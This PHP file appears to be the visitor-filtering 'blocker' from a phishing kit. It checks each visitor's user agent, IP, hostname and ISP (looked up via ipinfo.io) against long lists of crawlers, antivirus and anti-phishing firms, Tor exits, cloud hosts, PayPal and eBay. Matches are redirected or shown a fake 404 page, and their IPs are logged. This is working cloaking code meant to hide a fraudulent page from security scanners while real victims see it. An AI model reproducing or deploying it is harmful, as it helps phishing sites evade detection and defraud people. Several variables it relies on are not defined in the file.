<?php

$user_agent = $_SERVER['HTTP_USER_AGENT'];
$user_ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$bots_agents = array('googlebot','yahoo','slurp','yahooSeeker','facebookexternalhit','ia_archiver','yandexbot','baiduspider','crawler','httrack','pycurl','python-requests','curl','wget','phish','Http Crawler');
$bots_ips = array('1.9.2.13','1.9.2.15');
$blocked_words = array("above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit","avast");
$shit_isps = array("DigitalOcean","Amazon","Google","phishtank","net4sec","AVAST Software s.r.o.","BullGuard ApS","PayPal","Hotmail","Yahoo","AOL","Microsoft","Kaspersky Lab","Linode, LLC","MSN","ONLINE S.A.S.",'Peak 10',
                'Quasi Networks LTD',
                'SC Rusnano',
                'GoDaddy.com, LLC',
                'Server Plan S.r.l.',
                'Linode',
                'Blazing SEO',
                'Lixux OU',
                'Inter Connects Inc',
                'Flokinet Ltd',
                'LukMAN Multimedia Sp. z o.o',
                'PIPEX-BLOCK1',
                'IPVanish',
                'LinkGrid LLC',
                'Snab-Inform Private Enterprise',
                'Cisco Systems',
                'Network and Information Technology Limited',
                'London Wires Ltd.',
                'Tehnologii Budushego LLC',
                'Eonix Corporation',
                'hosttech GmbH',
                'Wowrack.com',
                'SunGard Availability Services LP',
                'Internap Network Services Corporation',
                'Palo Alto Networks',
                'PlusNet Technologies Ltd',
                'Scaleway',
                'Facebook',
                'Host1Plus',
                'XO Communications',
                'Nobis Technology Group',
                'ExpressVPN',
                'DME Hosting LLC',
                'Prescient Software',
                'Sungard Network Solutions',
                'OVH SAS',
                'Iomart Hosting Ltd',
                'Hosting Solution',
                'Barracuda Networks',
                'Sungard Network Solutions',
                'Solar VPS',
                'PHPNET Hosting Services',
                'DigitalOcean',
                'Level 3 Communications',
                'softlayer',
                'Chelyabinsk-Signal LLC',
                'SoftLayer Technologies',
                'Complete Internet Access',
                'london-tor.mooo.com',
                'amazonaws',
                'cyveillance',
                'phishtank',
                'tor.piratenpartei-nrw.de',
                'cpanel66.proisp.no',
                'tor-node.com',
                'dreamhost',
                'Involta',
                'exit0.liskov.tor-relays.net',
                'tor.tocici.com',
                'netpilot',
                'calyxinstitute',
                'tor-exit',
                'msnbot',
                'p3pwgdsn',
                'netcraft',
                'University of Virginia',
                'trendmicro',
                'ebay',
                'paypal',
                'torservers',
                'comodo',
                'EGIHosting',
                'ebbs.healingpathsolutions.com',
                'healingpathsolutions.com',
                'Solution Pro',
                'Zayo Bandwidth',
                'spider.clicktargetdevelopment.com',
                'clicktargetdevelopment.com',
                'static.spro.net',
                'Digital Ocean',
                'Internap Network Services Corporation',
                'Blue Coat Systems',
                'GANDI SAS',
                'roamsite.com',
                'PIPEX-BLOCK1',
                'ColoUp',
                'Westnet',
                'The University of Tokyo',
                'University',
                'University of',
                'QuadraNet',
                'exit-01a.noisetor.net',
                'noisetor.net',
                'noisetor',
                'vultr.com',
                'Zscaler',
                'Choopa',
                'RedSwitches Pty',
                'Quintex Alliance Consulting',
                'www16.mailshell.com',
                'this.is.a.tor.exit-node.net',
                'this.is.a.tor.node.xmission.com',
                'colocrossing.com',
                'DedFiberCo',
                'crawl',
                'sucuri.net',
                'crawler',
                'proxy',
                'enom',
                'cloudflare',
                'yahoo',
                'trustwave',
                'rima-tde.net',
                'tfbnw.net',
                'pacbell.net',
                'tpnet.pl',
                'ovh.net',
                'centralnic',
                'badware',
                'phishing',
                'antivirus',
                'SiteAdvisor',
                'McAfee',
                'Bitdefender',
                'avirasoft',
                'phishtank.com',
                'OVH SAS',
                'Yahoo',
                'Yahoo! Inc.',
                'Google',
                'GoDaddy',
                'Amazon Technologies Inc.',
                'Amazon',
                'Top Level Hosting SRL',
                'Twitter',
                'Microsoft',
                'Microsoft Corporation',
                'OVH',
                'VPSmalaysia.com.my',
                'Madgenius.com',
                'Barracuda Networks Inc.',
                'Barracuda',
                'SecuredConnectivity.net',
                'Digital Domain',
                'Hetzner Online',
                'Akamai',
                'SoftLayer',
                'SURFnet',
                'Creative Thought Inc.',
                'Fastly',
                'Return Path Inc.',
                'WhatsApp',
                'Instagram',
                'Schulte Consulting LLC',
                'Universidade Federal do Rio de Janeiro',
                'Sectoor',
                'Bitfolk',
                'Team Technologies LLC',
                'Mainloop',
                'Junk Email Filter Inc.',
                'Art Matrix - Lightlink Inc.',
                'Redpill Linpro AS',
                'CloudFlare',
                'ESET spol. s r.o.',
                'AVAST Software s.r.o.',
                'Dosarrest',
                'Apple Inc.',
                'Symantec',
                'Mozilla',
                'Netprotect SRL',
                'Host Europe GmbH',
                'Host Sailor Ltd.',
                'PSINet Inc.',
                'Daniel James Austin',
                'RamNode',
                'Hostalia',
                'Xs4all Internet BV',
                'Inktomi Corporation',
                'Eircom Customer Assignment',
                '9New Network Inc',
                'Sony',
                'Private IP Address LAN',
                'Computer Problem Solving',
                'Fortinet',
                'Avira',
                'Rackspace',
                'Baidu',
                'Comodo',
                'Incapsula Inc',
                'Orange Polska Spolka Akcyjna',
                'Infosphere',
                'Private Customer',
                'SurfControl',
                'University of Newcastle upon Tyne',
                'Total Server Solutions',
                'LukMAN',
                'eSecureData',
                'Hosting',
                'VI Na Host Co. Ltd',
                'B2 Net Solutions',
                'Master Internet',
                'Global Perfomance',
                'Fireeye',
                'AntiVirus',
                'Security',
                'Intersoft Internet',
                'Voxility',
                'Linode',
                'Internet-Pro',
                'Trustwave Holdings Inc',
                'Online SAS',
                'Versaweb',
                'Liquid Web',
                'A100 ROW',
                'Apexis AG',
                'Apexis',
                'LogicWeb',
                'Virtual1 Limited',
                'VNET a.s.',
                'Static IP Assignment',
                'TerraTransit AG',
                'Merit Network',
                'PathsConnect',
                'Long Thrive',
                'LG DACOM',
                'Secure Internet',
                'Kaspersky',
                'UK Dedicated Servers Limited',
                'Customer Network',
                'Flokinet',
                'Simpli Networks LLC',
                'Psychz',
                'PrivateSystems Networks',
                'ScanSafe Services',
                'CachedNet',
                'CloudVPN',
                'Spark New Zealand Trading Ltd',
                'Whitelabel IT Solutions Corp',
                'Hostwinds',
                'Hosteros LLC',
                'HostUS',
                'Host',
                'ClientID',
                'Server',
                'Oracle',
                'Fortinet',
                'Unus Inc.',
                'Public facing services',
                'Virtual Employee Pvt Ltd',
                'Dataline Ltd',
                'Teksavvy Solutions Inc.',
                'UPC Romania Bucuresti',
                'TalkTalk Communications Limited',
                'British Telecommunications PLC',
                'Global Data Networks LLC',
                'Quintex Alliance Consulting',
                'Online S.A.S.',
                'Content Delivery Network Ltd',
                'Nobis Technology Group LLC',
                'Parrukatu',
                'JSC ER-Telecom Holding',
                'ChinaNet Fujian Province Network',
                'QualityNetwork',
                'Vist On-Line Ltd',
                'The Calyx Institute',
                'Internet Customers',
                'OJSC Oao Tattelecom',
                'Petersburg Internet Network Ltd.',
                'Psychz Networks',
                'Udasha',
                'Onavo Mobile Ltd',
                'Cubenode System SL',
                'OVH Hosting Inc.',
                'NForce Entertainment B.V.',
                'DigitalOcean LLC',
                'Glenayre Electronics Inc.',
                'British Telecommunications PLC',
                'Iomart Hosting Limited',
                'Digital Energy Technologies Limited',
                'Private Customer',
                'Cisco Systems Inc.',
                'Vultr Holdings LLC',
                'Amazon.com Inc.',
                'Web Hosting Solutions',
                'Time Warner Cable Internet LLC',
                'Internet Security - TC',
                'Vertical Telecoms Broadband Networks and Internet Provider',
                'Ventelo Wholesale',
                'MYX Group LLC',
                'France Telecom S.A.',
                'Online S.A.S.',
                'Nine Internet Solutions AG',
                'Microsoft Azure',
                'Choopa, LLC',
                'Amazon',
                'HighWinds Network',
                'Amazon.com',
                'Bell Canada',
                'Digital Ocean',
                'M247 LTD Frankfurt Infrastructure',
                'Palo Alto Networks',
                'Spectrum',
                'ImOn Communications, LLC',
                'Wintek Corporation',
                'ServerMania',
                'Claro Dominican Republic',
                '013 NetVision',
                'Amazon.com',
                'Digital Ocean',
                'TalkTalk',
                'HostDime.com',
                'AVAST Software s.r.o.',
                'Host1Plus Cloud Servers',
                'Amazon Data Services NoVa',
                'Google Cloud',
                'M-net',
                'Digiweb ltd',
                'Prescient Software',
                'Eir Broadband',
                'Solution Pro',
                'Bell Canada',
                'Linode',
                'DigitalOcean',
                'Plusnet',
                'GigeNET',
                'ZenLayer',
                'NFOrce Entertainment B.V.',
                'NewMedia Express',
                'Telegram Messenger Network',
                'IQ PL Sp. z o.o.',
                'Datacamp Limited',
                'Tahoe Internet Exchange (TahoeIX)',
                'ITCOM Shpk',
                'HEG US',"Joshua Peter McQuistan");
foreach ($bots_agents as $bot_agent) {
    if (substr_count($user_agent, $bot_agent) > 0) {
        exit(header('Location: error.php'));
    }
}foreach ($bots_ips as $bot_ip) {
    if (preg_match('/'.$bot_ip.'/', $user_ip)) {
        exit(header('Location: error.php'));
    }
}foreach ($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
        exit(header('Location: error.php'));
    }
}$ipp = isset($user_ip) && $user_ip != "" ? $user_ip : "1.1.1.1";
$ISP = @file_get_contents('http://ipinfo.io/'.$ipp.'/org');
if ($ISP == false) {
    return "ppp";
}foreach ($shit_isps as $isp) {
    if (substr_count($ISP, $isp)) {
        exit(header('Location: error.php'));
    }
}



$v_agent = $user_agent;
if ($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)" || $v_agent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)") {
    $ip = getUserIP();
    $status = "bot";
    $detect = "Bot Microsoft";
}
if ($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {
    $ip = getUserIP();
    $status = "bot";
    $detect = "Bot Microsoft";
}
if ($os == "Windows Server 2003/XP x64") {
    $status = "bot";
    $detect = "Google Safebrowsing";
}
if ($os == "Windows 7" and $br == "Firefox") {
    $status = "bot";
    $detect = "Google Safebrowsing";
}
if ($os == "Windows XP" and $br == "Firefox") {
    $status = "bot";
    $detect = "Google Safebrowsing";
}
if ($os == "Windows XP" and $br == "Chrome") {
    $status = "bot";
    $detect = "Google Safebrowsing";
}
if ($os == "Windows Vista" or $os == "Ubuntu" or $os == "Chrome OS" or $os == "BlackBerry" or $os == "Linux") {
    $status = "bot";
    $detect = "Google Safebrowsing";
}
if ($br == "Internet Explorer") {
    $status = "bot";
    $detect = "Google Safebrowsing";
}
if ($br == "Unknown Browser") {
    $status = "bot";
    $detect = "Google Safebrowsing";
}
if ($os == "Windows 2000") {
    $status = "bot";
    $detect = "Google Safebrowsing";
}
if ($os == "Unknown OS Platform") {
    $status = "bot";
    $detect = "Google Safebrowsing";
}
if ($status == "bot") {
    $ip = getenv("REMOTE_ADDR");
    $file = fopen("block_bot.txt", "a");
    fwrite($file, "  " . $ip . " (Detect by blocker) 
");
    $click = fopen("result/total_bot.txt", "a");
    fwrite($click, "$ip (Detect by blocker)" . "
");
    fclose($click);
    header("HTTP/1.0 404 Not Found");
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1></body></html>');
};
